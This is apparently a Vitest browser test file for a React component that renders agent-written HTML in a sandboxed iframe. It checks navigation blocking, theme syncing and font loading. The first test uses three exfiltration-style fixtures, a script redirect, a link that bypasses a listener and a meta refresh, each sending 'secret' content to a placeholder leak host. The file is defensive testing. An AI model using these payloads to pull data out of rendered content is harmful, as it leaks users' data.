import { createRoot } from "react-dom/client";
import { expect, it } from "vitest";
import { commands } from "vitest/browser";
import { HtmlRenderFrame } from "./HtmlRenderFrame";
import { buildHtmlRenderGuard } from "./HtmlRenderFrame.guard";

declare module "vitest/browser" {
  interface BrowserCommands {
    checkHtmlRenderNavigation: (
      document: string,
      clickLink: boolean,
    ) => Promise<{
      remainingFrames: number;
      requests: string[];
    }>;
  }
}

it.each([
  `<script>location.href='https://render-leak.invalid/script?secret=content'</script>`,
  // Agent code can bypass the open-link listener; the CSP violation backstop still applies.
  `<a href="https://render-leak.invalid/link?secret=content" onclick="event.stopPropagation()">Leave</a>`,
  `<meta http-equiv="refresh" content="0;url=https://render-leak.invalid/refresh?secret=content">`,
])("blocks navigation before requests and hides the failed visual: %s", async (html) => {
  expect(
    await commands.checkHtmlRenderNavigation(buildHtmlRenderGuard(html), html.startsWith("<a")),
  ).toEqual({ remainingFrames: 0, requests: [] });
});

it("runs JavaScript without same-origin privileges and syncs theme changes", async () => {
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  const observations: Array<{ blocked: boolean; color: string; chart: string; radius: string }> =
    [];
  function receive(event: MessageEvent) {
    if (
      event.source === host.querySelector("iframe")?.contentWindow?.[0] &&
      event.data?.type === "render-test"
    )
      observations.push(event.data);
  }
  window.addEventListener("message", receive);
  const original = ["--primary", "--chart-1", "--radius"].map(
    (key) => [key, document.documentElement.style.getPropertyValue(key)] as const,
  );
  document.documentElement.style.setProperty("--primary", "rgb(1, 2, 3)");
  document.documentElement.style.setProperty("--chart-1", "rgb(7, 8, 9)");
  document.documentElement.style.setProperty("--radius", "3px");
  try {
    root.render(
      <HtmlRenderFrame
        content={{
          title: "Sandbox",
          html: `<p>Sandbox</p><script>
       let blocked = false; try { void parent.document.body; } catch { blocked = true; }
      parent.postMessage({type:'securitypolicyviolation',effectiveDirective:'frame-src'}, '*');
      dispatchEvent(new SecurityPolicyViolationEvent('securitypolicyviolation', {effectiveDirective:'frame-src'}));
      function report() {
        const styles = getComputedStyle(document.documentElement);
        parent.parent.postMessage({ type:'render-test', blocked, color:styles.getPropertyValue('--primary'), chart:styles.getPropertyValue('--chart-1'), radius:styles.getPropertyValue('--radius') }, '*');
      }
      addEventListener('message', () => setTimeout(report, 0));
    </script>`,
        }}
      />,
    );
    await expect
      .poll(() => observations.some((value) => value.blocked && value.color === "rgb(1, 2, 3)"))
      .toBe(true);
    expect(observations.at(-1)).toMatchObject({ chart: "rgb(7, 8, 9)", radius: "3px" });
    document.documentElement.style.setProperty("--primary", "rgb(4, 5, 6)");
    await expect
      .poll(() => observations.some((value) => value.blocked && value.color === "rgb(4, 5, 6)"))
      .toBe(true);
    expect(host.querySelector("iframe")?.getAttribute("sandbox")).toBe("allow-scripts");
  } finally {
    root.unmount();
    host.remove();
    window.removeEventListener("message", receive);
    for (const [key, value] of original) document.documentElement.style.setProperty(key, value);
  }
});

it("loads actual bundled upright and italic DM Sans faces inside the sandbox", async () => {
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  let fonts: unknown;
  function receive(event: MessageEvent) {
    if (
      event.source === host.querySelector("iframe")?.contentWindow?.[0] &&
      event.data?.type === "font-test"
    )
      fonts = event.data.fonts;
  }
  window.addEventListener("message", receive);
  try {
    root.render(
      <HtmlRenderFrame
        content={{
          title: "Fonts",
          html: `<script>
      Promise.all([document.fonts.load('400 14px "DM Sans"'), document.fonts.load('italic 700 14px "DM Sans"')]).then(groups => {
        parent.parent.postMessage({type:'font-test', fonts:groups.map(faces => faces.map(face => ({family:face.family,status:face.status,style:face.style})))}, '*');
      });
    </script>`,
        }}
      />,
    );
    await expect
      .poll(() => fonts)
      .toEqual([
        [{ family: "DM Sans", status: "loaded", style: "normal" }],
        [{ family: "DM Sans", status: "loaded", style: "italic" }],
      ]);
  } finally {
    root.unmount();
    host.remove();
    window.removeEventListener("message", receive);
  }
});
